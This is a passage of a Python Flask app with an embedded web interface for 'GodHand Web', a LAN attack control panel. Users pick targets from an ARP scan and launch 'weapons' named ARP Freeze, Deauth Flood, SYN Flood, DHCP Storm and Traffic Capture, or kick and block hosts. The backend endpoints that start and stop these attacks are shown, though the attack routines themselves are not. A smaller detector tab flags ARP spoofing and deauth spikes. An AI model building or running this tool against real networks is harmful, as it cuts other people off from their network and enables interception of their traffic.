    gap: 10px;
    flex-wrap: wrap;
    margin: 10px 0;
  }
  .log-container {
    background: var(--panel-2);
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 8px;
    max-height: 200px;
    overflow-y: auto;
    font-family: var(--mono);
    font-size: 12px;
    color: var(--dim);
    margin-top: 10px;
  }
  .log-container .log-entry {
    padding: 2px 0;
    border-bottom: 1px solid #1a2636;
  }
  .log-container .log-entry .time {
    color: var(--dim);
    margin-right: 8px;
  }
  .log-container .log-entry .msg {
    color: var(--text);
  }
  .log-container .log-entry.error .msg { color: var(--bad); }
  .log-container .log-entry.success .msg { color: var(--good); }
  .log-container .log-entry.warn .msg { color: var(--warn); }
  .spinner {
    display: inline-block;
    width: 16px;
    height: 16px;
    border: 2px solid var(--border);
    border-top-color: var(--accent);
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .target-badge {
    font-size: 11px;
    color: var(--accent);
    margin-left: 6px;
  }
</style>
</head>
<body>
<header>
  <h1><span class="dot"></span>🧸 GodHand Web – Baby Blue Edition</h1>
  <p>All‑in‑one network control centre: monitor, attack, kick, block.</p>
</header>

<div class="banner" id="prereq-banner">
  ⚠️ <span id="prereq-msg"></span> <a href="#" onclick="switchTab('settings')">Go to Settings</a>
</div>

<nav id="main-nav">
  <button class="tab-btn active" data-tab="attacks">🎯 Attacks</button>
  <button class="tab-btn" data-tab="targets">📋 Targets</button>
  <button class="tab-btn" data-tab="hosts">📡 Hosts</button>
  <button class="tab-btn" data-tab="settings">⚙️ Settings</button>
  <button class="tab-btn" data-tab="devicewatch">📊 Device Watch</button>
  <button class="tab-btn" data-tab="detector">🛡️ Detector</button>
  <button class="tab-btn" data-tab="logs">📜 Logs</button>
</nav>

<main>
  <!-- ATTACKS TAB -->
  <div class="tab active" id="tab-attacks">
    <div class="panel">
      <h2>Choose your weapon</h2>
      <p class="sub">Select an attack, set targets, then press <strong>Start</strong>.</p>
      <div class="weapon-grid" id="weapon-grid">
        <div class="weapon-btn active" data-w="1"><span class="num">1</span>ARP Freeze</div>
        <div class="weapon-btn" data-w="2"><span class="num">2</span>Deauth Flood</div>
        <div class="weapon-btn" data-w="3"><span class="num">3</span>SYN Flood</div>
        <div class="weapon-btn" data-w="4"><span class="num">4</span>DHCP Storm</div>
        <div class="weapon-btn" data-w="5"><span class="num">5</span>Traffic Capture</div>
      </div>
      <div class="btn-group">
        <button class="btn big" id="start-btn" onclick="confirmStartAttack()">▶ Start</button>
        <button class="btn big secondary" onclick="confirmStopAttack()">⏹ Stop</button>
      </div>
      <div id="attack-status" class="status-msg">Status: Ready</div>
    </div>
    <div class="panel">
      <h2>Quick actions</h2>
      <div class="row">
        <button class="btn" onclick="kickSelected()">👢 Kick client</button>
        <button class="btn" onclick="toggleBlock()">🔒 Block/Unblock</button>
        <button class="btn secondary" onclick="refreshHosts()">🔄 Rescan LAN</button>
      </div>
    </div>
  </div>

  <!-- TARGETS TAB -->
  <div class="tab" id="tab-targets">
    <div class="panel">
      <h2>Your targets</h2>
      <p class="sub">Add IPs from discovered hosts or type manually.</p>
      <div class="row">
        <input type="text" id="target-ip" placeholder="IP address">
        <button class="btn" onclick="addTarget()">Add</button>
      </div>
      <table id="target-table">
        <thead><tr><th>IP</th><th>MAC</th><th></th></tr></thead>
        <tbody id="target-body"></tbody>
      </table>
      <div class="empty" id="target-empty">No targets added.</div>
    </div>
  </div>

  <!-- HOSTS TAB -->
  <div class="tab" id="tab-hosts">
    <div class="panel">
      <h2>Discovered hosts</h2>
      <p class="sub">Scan the LAN to populate this list. Check boxes to bulk add to targets.</p>
      <div class="row">
        <button class="btn" id="scan-btn" onclick="refreshHosts()">🔄 Scan now</button>
        <button class="btn secondary" onclick="bulkAddTargets()">Add selected to targets</button>
        <span id="scan-spinner" style="display:none;"><span class="spinner"></span> Scanning...</span>
      </div>
      <table id="host-table">
        <thead><tr><th><input type="checkbox" id="select-all-hosts" onchange="toggleAllHosts()"></th><th>IP</th><th>MAC</th><th>Reachability</th><th>Action</th></tr></thead>
        <tbody id="host-body"></tbody>
      </table>
      <div class="empty" id="host-empty">No hosts discovered. Press "Scan now".</div>
    </div>
  </div>

  <!-- SETTINGS TAB -->
  <div class="tab" id="tab-settings">
    <div class="panel">
      <h2>Interface & gateway</h2>
      <p class="sub">Set your Wi‑Fi interface and gateway IP.</p>
      <div class="row">
        <select id="iface-select"></select>
        <button class="btn" onclick="setInterface()">Set interface</button>
      </div>
      <div class="row">
        <input type="text" id="gateway-input" placeholder="Gateway IP">
        <button class="btn" onclick="setGateway()">Set gateway</button>
      </div>
      <div class="row">
        <input type="number" id="port-input" placeholder="Port (1-65535)" value="80">
        <button class="btn" onclick="setPort()">Set port</button>
      </div>
      <div id="settings-status" class="status-msg">Current: IFACE: none, GW: none, PORT: 80</div>
    </div>
  </div>

  <!-- DEVICE WATCH TAB (renamed from Monitor) -->
  <div class="tab" id="tab-devicewatch">
    <div class="panel">
      <h2>Add a device</h2>
      <p class="sub">Track hosts on your own LAN. Server-side ping is used for reachability.</p>
      <div class="row">
        <input type="text" id="dev-name" placeholder="Label (e.g. Living Room TV)">
        <input type="text" id="dev-ip" placeholder="IP address (e.g. 192.168.1.20)">
        <button class="btn" onclick="addDevice()">Add</button>
      </div>
    </div>
    <div class="panel">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
        <h2 style="margin:0;">Tracked devices</h2>
        <button class="btn secondary" onclick="checkAllDevices()">Check all</button>
      </div>
      <p class="sub">Uses server-side ping (ICMP) for reliable reachability.</p>
      <table id="dev-table">
        <thead><tr><th>Label</th><th>IP</th><th>Status</th><th>Latency</th><th></th></tr></thead>
        <tbody></tbody>
      </table>
      <div class="empty" id="dev-empty">No devices yet. Add one above.</div>
    </div>
  </div>

  <!-- DETECTOR TAB (unchanged mostly, but can be enhanced later) -->
  <div class="tab" id="tab-detector">
    <div class="panel">
      <h2>Paste an ARP snapshot</h2>
      <p class="sub">
        On your LAN, run <code>arp -a</code> (Windows/Mac/Linux) and paste the output below. Do this a couple of times,
        a few minutes apart. The detector flags when an IP's MAC address changes unexpectedly, or when one MAC claims
        multiple IPs — both are classic signs of ARP spoofing.
      </p>
      <textarea id="arp-input" placeholder="e.g.&#10;192.168.1.1 dev wlan0 lladdr aa:bb:cc:dd:ee:ff&#10;192.168.1.20 dev wlan0 lladdr 11:22:33:44:55:66&#10;&#10;or Windows format:&#10;192.168.1.1     aa-bb-cc-dd-ee-ff     dynamic"></textarea>
      <div class="row" style="margin-top:10px;">
        <button class="btn" onclick="ingestArp()">Analyze snapshot</button>
        <button class="btn secondary" onclick="clearArpHistory()">Clear history</button>
      </div>
      <p class="help">Snapshots analyzed so far: <span id="arp-snap-count">0</span></p>
    </div>
    <div class="panel">
      <h2>Paste deauth / frame-count log (optional)</h2>
      <p class="sub">
        If you capture wireless management-frame counts (e.g. from a monitoring tool's CSV — one line per reading,
        format <code>timestamp,count</code> or just a number per line), paste it here to flag sudden spikes that can
        indicate a deauth flood in progress.
      </p>
      <textarea id="deauth-input" placeholder="e.g.&#10;2,3,1,4,2,58,61,2,3"></textarea>
      <div class="row" style="margin-top:10px;">
        <button class="btn" onclick="analyzeDeauth()">Analyze log</button>
      </div>
    </div>
    <div class="panel">
      <h2>Alerts</h2>
      <div id="alerts"></div>
      <div class="empty" id="alerts-empty">No anomalies detected yet.</div>
    </div>
  </div>

  <!-- LOGS TAB -->
  <div class="tab" id="tab-logs">
    <div class="panel">
      <h2>Activity log (server-side)</h2>
      <p class="sub">All actions are logged on the server and synced to this view.</p>
      <button class="btn secondary" onclick="clearServerLogs()">Clear server log</button>
      <div class="log-container" id="log-container"></div>
    </div>
  </div>
</main>

<script>
// ---------- global state (client) ----------
let selectedWeapon = 1;
let currentTargets = [];
let currentHosts = [];
let attackRunning = {};   // weapon_id -> true/false based on server
let logPollTimer = null;
let attackPollTimer = null;
let devices = JSON.parse(localStorage.getItem('lg_devices') || '[]');
let arpHistory = JSON.parse(localStorage.getItem('lg_arp_history') || '[]');
let alerts = JSON.parse(localStorage.getItem('lg_alerts') || '[]');

// ---------- UI helpers ----------
function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

function showStatus(msg, good=true) {
  const el = document.getElementById('attack-status');
  if (el) {
    el.textContent = 'Status: ' + msg;
    el.style.borderLeftColor = good ? 'var(--good)' : 'var(--bad)';
  }
}

function switchTab(tabId) {
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelector(`.tab-btn[data-tab="${tabId}"]`).classList.add('active');
  document.getElementById('tab-' + tabId).classList.add('active');
}

// ---------- tabs ----------
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => switchTab(btn.dataset.tab));
});

// ---------- weapon selection ----------
document.querySelectorAll('.weapon-btn').forEach(el => {
  el.addEventListener('click', () => {
    document.querySelectorAll('.weapon-btn').forEach(b => b.classList.remove('active'));
    el.classList.add('active');
    selectedWeapon = parseInt(el.dataset.w, 10);
  });
});

// ---------- API calls ----------
async function apiCall(endpoint, method='GET', data=null) {
  const opts = { method, headers: {'Content-Type': 'application/json'} };
  if (data) opts.body = JSON.stringify(data);
  const res = await fetch('/api/' + endpoint, opts);
  return res.json();
}

// ---------- Polling server logs ----------
async function pollLogs() {
  const data = await apiCall('logs');
  if (data.logs) {
    renderLogs(data.logs);
  }
}
function renderLogs(logs) {
  const container = document.getElementById('log-container');
  container.innerHTML = '';
  logs.slice(-100).forEach(entry => {
    const div = document.createElement('div');
    div.className = 'log-entry ' + entry.level;
    div.innerHTML = `<span class="time">[${entry.time}]</span><span class="msg">${escapeHtml(entry.msg)}</span>`;
    container.appendChild(div);
  });
  container.scrollTop = container.scrollHeight;
}
function clearServerLogs() {
  apiCall('clear_logs', 'POST').then(() => pollLogs());
}

// ---------- Polling attack status ----------
async function pollAttackStatus() {
  const data = await apiCall('attack_status');
  attackRunning = data.attacks;  // e.g. {1: true, 2: false}
  updateAttackButtons();
}
function updateAttackButtons() {
  const anyRunning = Object.values(attackRunning).some(v => v);
  document.getElementById('start-btn').disabled = anyRunning;
  document.getElementById('stop-btn').disabled = !anyRunning;
  // Update status text
  if (anyRunning) {
    const runningWeapons = Object.keys(attackRunning).filter(k => attackRunning[k]);
    showStatus('Running: ' + runningWeapons.join(', '), true);
  } else {
    showStatus('Ready', true);
  }
}

// ---------- Prerequisites check ----------
async function checkPrerequisites() {
  const state = await apiCall('state');
  const s = state.state;
  let missing = [];
  if (!s.interface) missing.push('interface not set');
  if (!s.gateway) missing.push('gateway not set');
  if (s.targets.length === 0) missing.push('no targets added');
  const banner = document.getElementById('prereq-banner');
  const msg = document.getElementById('prereq-msg');
  if (missing.length) {
    banner.style.display = 'block';
    msg.textContent = 'Missing prerequisites: ' + missing.join(', ');
  } else {
    banner.style.display = 'none';
  }
  // Also update settings display
  document.getElementById('settings-status').textContent =
    `Current: IFACE: ${s.interface || 'none'}, GW: ${s.gateway || 'none'}, PORT: ${s.port}`;
}

// ---------- Interface selection ----------
async function loadInterfaces() {
  const data = await apiCall('interfaces');
  const sel = document.getElementById('iface-select');
  sel.innerHTML = '';
  if (data.interfaces && data.interfaces.length > 0) {
    data.interfaces.forEach(iface => {
      const opt = document.createElement('option');
      opt.value = iface.name;
      let label = iface.name;
      if (iface.ip) label += ' (' + iface.ip + ')';
      if (iface.wireless) label += ' 📶';
      opt.textContent = label;
      sel.appendChild(opt);
    });
    let selected = data.interfaces.find(i => i.ip && i.wireless) ||
                  data.interfaces.find(i => i.ip) ||
                  data.interfaces[0];
    if (selected) {
      sel.value = selected.name;
      await setInterface();
      addLog('Auto-set interface to ' + selected.name, 'success');
    } else {
      addLog('No usable network interfaces found.', 'error');
    }
  } else {
    addLog('No network interfaces found.', 'error');
  }
}

async function setInterface() {
  const iface = document.getElementById('iface-select').value;
  if (!iface) return;
  const res = await apiCall('set_interface', 'POST', { interface: iface });
  showStatus(res.status, res.success);
  checkPrerequisites();
}

async function setGateway() {
  const gw = document.getElementById('gateway-input').value.trim();
  if (!gw) return;
  const res = await apiCall('set_gateway', 'POST', { gateway: gw });
  showStatus(res.status, res.success);
  checkPrerequisites();
}

async function setPort() {
  const port = parseInt(document.getElementById('port-input').value, 10);
  if (isNaN(port) || port<1 || port>65535) return;
  const res = await apiCall('set_port', 'POST', { port });
  showStatus(res.status, res.success);
  checkPrerequisites();
}

// ---------- Hosts ----------
async function refreshHosts() {
  const state = await apiCall('state');
  if (!state.state.interface) {
    showStatus('Please set an interface first in Settings.', false);
    return;
  }
  const scanBtn = document.getElementById('scan-btn');
  const spinner = document.getElementById('scan-spinner');
  scanBtn.disabled = true;
  spinner.style.display = 'inline-block';
  const res = await apiCall('scan');
  scanBtn.disabled = false;
  spinner.style.display = 'none';
  if (res.success) {
    currentHosts = res.hosts;
    renderHosts();
    showStatus('Scan complete: found ' + currentHosts.length + ' hosts', true);
    checkPrerequisites();
  } else {
    showStatus('Scan failed: ' + res.error, false);
  }
}

function renderHosts() {
  const tbody = document.getElementById('host-body');
  const empty = document.getElementById('host-empty');
  tbody.innerHTML = '';
  empty.style.display = currentHosts.length ? 'none' : 'block';
  currentHosts.forEach(h => {
    const isTarget = currentTargets.includes(h.ip);
    const tr = document.createElement('tr');
    tr.id = 'host-row-' + h.ip;
    tr.innerHTML = `
      <td><input type="checkbox" class="host-check" data-ip="${h.ip}"></td>
      <td>${escapeHtml(h.ip)}${isTarget ? '<span class="target-badge">🎯 Target</span>' : ''}</td>
      <td>${escapeHtml(h.mac)}</td>
      <td id="reach-${h.ip}"><span class="badge dim">Checking...</span></td>
      <td>
        ${isTarget 
          ? `<button class="btn secondary" onclick="removeTargetByIP('${h.ip}')">Remove target</button>`
          : `<button class="btn secondary" onclick="addTargetByIP('${h.ip}')">Add target</button>`}
        <button class="btn secondary" onclick="kickIP('${h.ip}')">Kick</button>
        <button class="btn secondary" onclick="toggleBlockIP('${h.ip}')">Block</button>
      </td>
    `;
    tbody.appendChild(tr);
    // Trigger server-side reachability check
    serverCheckReachability(h.ip);
  });
  // Update select-all checkbox state
  document.getElementById('select-all-hosts').checked = false;
}

async function serverCheckReachability(ip) {
  const cell = document.getElementById('reach-' + ip);
  if (!cell) return;
  cell.innerHTML = '<span class="badge dim">Checking...</span>';
  const res = await apiCall('check_reachability?ip=' + encodeURIComponent(ip));
  if (res.reachable) {
    cell.innerHTML = `<span class="badge good">Reachable (${res.latency}ms)</span>`;
  } else {
    cell.innerHTML = `<span class="badge bad">No response</span>`;
  }
}

function toggleAllHosts() {
  const checked = document.getElementById('select-all-hosts').checked;
  document.querySelectorAll('.host-check').forEach(cb => cb.checked = checked);
}

function bulkAddTargets() {
  const selectedIPs = Array.from(document.querySelectorAll('.host-check:checked')).map(cb => cb.dataset.ip);
  if (!selectedIPs.length) {
    alert('No hosts selected');
    return;
  }
  Promise.all(selectedIPs.map(ip => addTargetByIP(ip, false))).then(() => {
    loadTargets();
    renderHosts(); // refresh target badges
  });
}

// ---------- Targets ----------
async function addTargetByIP(ip, refresh = true) {
  const res = await apiCall('add_target', 'POST', { ip });
  if (res.success) {
    showStatus('Added target ' + ip, true);
    if (refresh) {
      loadTargets();
      renderHosts();
    }
  } else {
    showStatus('Error: ' + res.error, false);
  }
}

async function removeTargetByIP(ip) {
  const res = await apiCall('remove_target', 'POST', { ip });
  if (res.success) {
    showStatus('Removed target ' + ip, true);
    loadTargets();
    renderHosts();
  }
}

async function addTarget() {
  const ip = document.getElementById('target-ip').value.trim();
  if (!ip) return;
  await addTargetByIP(ip);
  document.getElementById('target-ip').value = '';
}

async function loadTargets() {
  const res = await apiCall('state');
  currentTargets = res.state.targets || [];
  const tbody = document.getElementById('target-body');
  const empty = document.getElementById('target-empty');
  tbody.innerHTML = '';
  empty.style.display = currentTargets.length ? 'none' : 'block';
  currentTargets.forEach(ip => {
    const host = currentHosts.find(h => h.ip === ip);
    const mac = host ? host.mac : '—';
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${escapeHtml(ip)}</td>
      <td>${escapeHtml(mac)}</td>
      <td><button class="icon-btn" onclick="removeTargetByIP('${ip}')">✕</button></td>
    `;
    tbody.appendChild(tr);
  });
  checkPrerequisites();
}

// ---------- Attacks ----------
async function confirmStartAttack() {
  if (!confirm(`Are you sure you want to start attack weapon ${selectedWeapon}?`)) return;
  const state = await apiCall('state');
  if (!state.state.interface) {
    showStatus('Please set an interface first in Settings.', false);
    switchTab('settings');
    return;
  }
  if (state.running_attacks && state.running_attacks.length > 0) {
    showStatus('An attack is already running. Stop it first.', false);
    return;
  }
  const btn = document.getElementById('start-btn');
  btn.disabled = true;
  btn.textContent = '⏳ Starting...';
  showStatus('Starting attack...', true);
  const res = await apiCall('start_attack', 'POST', { weapon: selectedWeapon });
  btn.disabled = false;
  btn.textContent = '▶ Start';
  if (res.success) {
    showStatus('Attack started: ' + res.weapon, true);
    pollAttackStatus();
  } else {
    showStatus('Failed: ' + res.error, false);
  }
}

async function confirmStopAttack() {
  if (!confirm('Stop all running attacks?')) return;
  const res = await apiCall('stop_attack', 'POST');
  showStatus(res.status, res.success);
  pollAttackStatus();
}

// ---------- Kick & Block ----------
async function kickIP(ip) {
  if (!confirm(`Kick ${ip}?`)) return;
  const res = await apiCall('kick', 'POST', { ip });
  showStatus(res.status, res.success);
  if (res.success) {
    addLog(res.status, 'success');
  } else {
    addLog(res.status, 'error');
  }
}

async function toggleBlockIP(ip) {
  const res = await apiCall('block', 'POST', { ip });
  showStatus(res.status, res.success);
  if (res.success) {
    addLog(res.status, 'success');
  } else {
    addLog(res.status, 'error');
  }
}

function kickSelected() {
  const ip = prompt('Enter IP to kick (from host list):');
  if (ip) kickIP(ip);
}

function toggleBlock() {
  const ip = prompt('Enter IP to block/unblock:');
  if (ip) toggleBlockIP(ip);
}

// ---------- Device Watch (server-side ping) ----------
function renderDevices() {
  const tbody = document.querySelector('#dev-table tbody');
  const empty = document.getElementById('dev-empty');
  tbody.innerHTML = '';
  empty.style.display = devices.length ? 'none' : 'block';
  devices.forEach((d, i) => {
    const tr = document.createElement('tr');
    let badge = '<span class="badge dim">Not checked</span>';
    if (d.status === 'up') badge = '<span class="badge good">Reachable</span>';
    else if (d.status === 'down') badge = '<span class="badge bad">No response</span>';
    else if (d.status === 'checking') badge = '<span class="badge warn">Checking…</span>';
    tr.innerHTML = `
      <td style="font-family:-apple-system,sans-serif;">${escapeHtml(d.name || '—')}</td>
      <td>${escapeHtml(d.ip)}</td>
      <td>${badge}</td>
      <td>${d.latency ? d.latency + ' ms' : '—'}</td>
      <td>
        <button class="icon-btn" title="Check" onclick="checkDevice(${i})">↻</button>
        <button class="icon-btn" title="Remove" onclick="removeDevice(${i})">✕</button>
      </td>`;
    tbody.appendChild(tr);
  });
}

function addDevice() {
  const name = document.getElementById('dev-name').value.trim();
  const ip = document.getElementById('dev-ip').value.trim();
  if (!ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) { alert('Enter a valid IPv4 address.'); return; }
  devices.push({ name, ip, status: null, latency: null });
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  document.getElementById('dev-name').value = '';
  document.getElementById('dev-ip').value = '';
  renderDevices();
}

function removeDevice(i) {
  devices.splice(i, 1);
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  renderDevices();
}

async function checkDevice(i) {
  const d = devices[i];
  d.status = 'checking';
  renderDevices();
  const res = await apiCall('check_reachability?ip=' + encodeURIComponent(d.ip));
  if (res.reachable) {
    d.latency = res.latency;
    d.status = 'up';
  } else {
    d.status = 'down';
    d.latency = null;
  }
  localStorage.setItem('lg_devices', JSON.stringify(devices));
  renderDevices();
}

function checkAllDevices() {
  devices.forEach((_, i) => checkDevice(i));
}

// ---------- ARP Detector (unchanged) ----------
function parseArpText(text) {
  const entries = {};
  const lines = text.split('\n');
  const ipRe = /(\d{1,3}(?:\.\d{1,3}){3})/;
  const macRe = /([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}/;
  lines.forEach(line => {
    const ipm = line.match(ipRe);
    const macm = line.match(macRe);
    if (ipm && macm) {
      const ip = ipm[1];
      const mac = macm[0].toLowerCase().replace(/-/g, ':');
      entries[ip] = mac;
    }
  });
  return entries;
}

function ingestArp() {
  const text = document.getElementById('arp-input').value;
  const entries = parseArpText(text);
  if (Object.keys(entries).length === 0) {
    pushAlert("Couldn't parse any IP/MAC pairs from that input — check the format.", 'warn');
    renderAlerts();
    return;
  }
  const snapshot = { time: new Date().toISOString(), entries };
  if (arpHistory.length > 0) {
    const prev = arpHistory[arpHistory.length - 1];
    Object.keys(entries).forEach(ip => {
      if (prev.entries[ip] && prev.entries[ip] !== entries[ip]) {
        pushAlert(`IP ${ip} changed MAC address: ${prev.entries[ip]} → ${entries[ip]}. Could be legit (device rejoin/DHCP) or ARP spoofing — verify physically if this is your gateway or a critical device.`, 'bad');
      }
    });
    const macToIps = {};
    Object.entries(entries).forEach(([ip, mac]) => {
      macToIps[mac] = macToIps[mac] || [];
      macToIps[mac].push(ip);
    });
    Object.entries(macToIps).forEach(([mac, ips]) => {
      if (ips.length > 1) {
        pushAlert(`MAC ${mac} is claiming multiple IPs in this snapshot: ${ips.join(', ')}. A single MAC answering for several IPs (especially your gateway) is a strong ARP-spoofing signal.`, 'bad');
      }
    });
  }
  arpHistory.push(snapshot);
  localStorage.setItem('lg_arp_history', JSON.stringify(arpHistory));
  document.getElementById('arp-snap-count').textContent = arpHistory.length;
  renderAlerts();
}

function clearArpHistory() {
  arpHistory = [];
  localStorage.setItem('lg_arp_history', JSON.stringify(arpHistory));
  document.getElementById('arp-snap-count').textContent = 0;
}

function analyzeDeauth() {
  const text = document.getElementById('deauth-input').value.trim();
  if (!text) return;
  const nums = text.split(/[\n,]+/).map(s => parseFloat(s.trim())).filter(n => !isNaN(n));
  if (nums.length < 3) {
    pushAlert('Need at least a few readings to detect a spike pattern.', 'warn');
    renderAlerts();
    return;
  }
  const mean = nums.reduce((a, b) => a + b, 0) / nums.length;
  const std = Math.sqrt(nums.reduce((a, b) => a + (b - mean) ** 2, 0) / nums.length) || 1;
  nums.forEach((n, i) => {
    if (n > mean + 3 * std && n > 10) {
      pushAlert(`Reading #${i + 1} (value ${n}) is a major spike above baseline (avg ${mean.toFixed(1)}) — consistent with a deauth flood or wireless jamming burst.`, 'bad');
    }
  });
  renderAlerts();
}

function pushAlert(msg, level) {
  alerts.unshift({ msg, level, time: new Date().toLocaleString() });
  alerts = alerts.slice(0, 50);
  localStorage.setItem('lg_alerts', JSON.stringify(alerts));
  // Also log to server (optional)
  apiCall('add_log', 'POST', { level: level === 'bad' ? 'error' : 'warn', msg });
}

function renderAlerts() {
  const box = document.getElementById('alerts');
  const empty = document.getElementById('alerts-empty');
  box.innerHTML = '';
  empty.style.display = alerts.length ? 'none' : 'block';
  alerts.forEach(a => {
    const div = document.createElement('div');
    div.className = 'alert-item' + (a.level === 'warn' ? ' warn' : '');
    div.innerHTML = `${escapeHtml(a.msg)}<div class="t">${a.time}</div>`;
    box.appendChild(div);
  });
}

// ---------- Init ----------
document.getElementById('arp-snap-count').textContent = arpHistory.length;
renderDevices();
renderAlerts();
loadInterfaces();
loadTargets();
checkPrerequisites();

// Start polling
logPollTimer = setInterval(pollLogs, 2000);
attackPollTimer = setInterval(pollAttackStatus, 2000);
pollLogs();
pollAttackStatus();
</script>
</body>
</html>
'''
    return render_template_string(html_template)

# ---------- API endpoints ----------
@app.route('/api/interfaces', methods=['GET'])
def api_interfaces():
    try:
        out = subprocess.check_output(['ip', '-o', 'link', 'show'], text=True)
        iface_list = []
        for line in out.splitlines():
            parts = line.split(':')
            if len(parts) >= 2:
                name = parts[1].strip()
                if name == 'lo':
                    continue
                ip = ''
                try:
                    ip_out = subprocess.check_output(['ip', '-o', '-4', 'addr', 'show', name], text=True)
                    for l in ip_out.splitlines():
                        if 'inet ' in l:
                            ip = l.split()[3].split('/')[0]
                            break
                except:
                    pass
                wireless = False
                try:
                    subprocess.check_output(['iw', 'dev', name, 'info'], stderr=subprocess.DEVNULL, text=True)
                    wireless = True
                except:
                    pass
                iface_list.append({'name': name, 'ip': ip, 'wireless': wireless})
        return jsonify({'interfaces': iface_list})
    except Exception as e:
        return jsonify({'interfaces': [], 'error': str(e)})

@app.route('/api/set_interface', methods=['POST'])
def api_set_interface():
    data = request.json
    iface = data.get('interface')
    if not iface:
        return jsonify({'success': False, 'status': 'No interface provided'})
    STATE['interface'] = iface
    add_log('info', f'Interface set to {iface}')
    return jsonify({'success': True, 'status': f'Interface set to {iface}'})

@app.route('/api/set_gateway', methods=['POST'])
def api_set_gateway():
    data = request.json
    gw = data.get('gateway')
    if not gw or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', gw):
        return jsonify({'success': False, 'status': 'Invalid IP'})
    STATE['gateway'] = gw
    add_log('info', f'Gateway set to {gw}')
    return jsonify({'success': True, 'status': f'Gateway set to {gw}'})

@app.route('/api/set_port', methods=['POST'])
def api_set_port():
    data = request.json
    port = data.get('port')
    try:
        port = int(port)
    except:
        return jsonify({'success': False, 'status': 'Invalid port'})
    if port < 1 or port > 65535:
        return jsonify({'success': False, 'status': 'Invalid port'})
    STATE['port'] = port
    add_log('info', f'Port set to {port}')
    return jsonify({'success': True, 'status': f'Port set to {port}'})

@app.route('/api/state', methods=['GET'])
def api_state():
    return jsonify({
        'state': {
            'interface': STATE['interface'],
            'gateway': STATE['gateway'],
            'port': STATE['port'],
            'targets': STATE['targets'],
            'hosts': STATE['hosts'],
            'blocked_macs': list(STATE['blocked_macs']),
        },
        'running_attacks': list(STATE['attack_pids'].keys())
    })

@app.route('/api/scan', methods=['GET'])
def api_scan():
    iface = STATE['interface']
    if not iface:
        return jsonify({'success': False, 'error': 'Interface not set'})
    my_ip, cidr = get_my_ip_and_cidr(iface)
    if my_ip == '0.0.0.0':
        return jsonify({'success': False, 'error': 'No IP on interface'})
    hosts = arp_scan(iface, my_ip, cidr)
    STATE['hosts'] = hosts
    add_log('info', f'ARP scan completed, found {len(hosts)} hosts')
    return jsonify({'success': True, 'hosts': hosts})

@app.route('/api/add_target', methods=['POST'])
def api_add_target():
    data = request.json
    ip = data.get('ip')
    if not ip or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return jsonify({'success': False, 'error': 'Invalid IP'})
    if ip not in STATE['targets']:
        STATE['targets'].append(ip)
        add_log('info', f'Target added: {ip}')
    return jsonify({'success': True})

@app.route('/api/remove_target', methods=['POST'])
def api_remove_target():
    data = request.json
    ip = data.get('ip')
    if ip in STATE['targets']:
        STATE['targets'].remove(ip)
        add_log('info', f'Target removed: {ip}')
    return jsonify({'success': True})

@app.route('/api/start_attack', methods=['POST'])
def api_start_attack():
    data = request.json
    weapon = data.get('weapon')
    if weapon not in [1,2,3,4,5]:
        return jsonify({'success': False, 'error': 'Invalid weapon'})
    if not STATE['interface']:
        return jsonify({'success': False, 'error': 'Interface not set'})
    if not STATE['targets']:
        return jsonify({'success': False, 'error': 'No targets added'})
    if weapon != 5 and not STATE['gateway']:
        return jsonify({'success': False, 'error': 'Gateway not set'})
    # Kill any existing attack of same weapon
    if weapon in STATE['attack_pids']:
        kill_attack(STATE['attack_pids'][weapon])
        del STATE['attack_pids'][weapon]
    try:
        pids = run_attack(weapon, STATE['targets'], STATE['gateway'], STATE['port'], STATE['interface'])
        if not pids:
            raise RuntimeError('Attack launcher returned no processes')
        STATE['attack_pids'][weapon] = pids
        STATE['attack_status'][weapon] = 'running'
        weapon_names = {1:'ARP Freeze',2:'Deauth Flood',3:'SYN Flood',4:'DHCP Storm',5:'Traffic Capture'}
        add_log('success', f'Attack started: {weapon_names[weapon]}')
        # Schedule liveness check
        def liveness(weapon_id, proc_list):
            time.sleep(2)
            if any(p.poll() is not None for p in proc_list):
                STATE['attack_status'][weapon_id] = 'dead'
                add_log('error', f'Attack {weapon_names[weapon_id]} died unexpectedly')
        threading.Thread(target=liveness, args=(weapon, pids), daemon=True).start()
        return jsonify({'success': True, 'weapon': weapon_names[weapon]})
    except Exception as e:
        add_log('error', f'Attack start failed: {str(e)}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stop_attack', methods=['POST'])
def api_stop_attack():
    for weapon, pids in list(STATE['attack_pids'].items()):
        kill_attack(pids)
    STATE['attack_pids'].clear()
    STATE['attack_status'] = {}
    if 'monitor_log_path' in STATE and STATE['monitor_log_path']:
        try:
            os.unlink(STATE['monitor_log_path'])
        except:
            pass
        STATE['monitor_log_path'] = None
    if STATE['interface']:
        set_monitor(STATE['interface'], False)
    add_log('info', 'All attacks stopped')
    return jsonify({'success': True, 'status': 'All attacks stopped'})

@app.route('/api/attack_status', methods=['GET'])
def api_attack_status():
    # Check liveness of all running attacks
    for weapon, pids in STATE['attack_pids'].items():
        if any(p.poll() is not None for p in pids):
            STATE['attack_status'][weapon] = 'dead'
        else:
            STATE['attack_status'][weapon] = 'running'
    # Build response: weapon_id -> true if running
    attacks = {weapon: (STATE['attack_status'].get(weapon) == 'running') for weapon in STATE['attack_pids']}
    return jsonify({'attacks': attacks})

@app.route('/api/monitor_log', methods=['GET'])
def api_monitor_log():
    lines = STATE.get('monitor_log', [])
    return jsonify({'lines': lines[-50:]})

@app.route('/api/check_reachability', methods=['GET'])
def api_check_reachability():
    ip = request.args.get('ip')
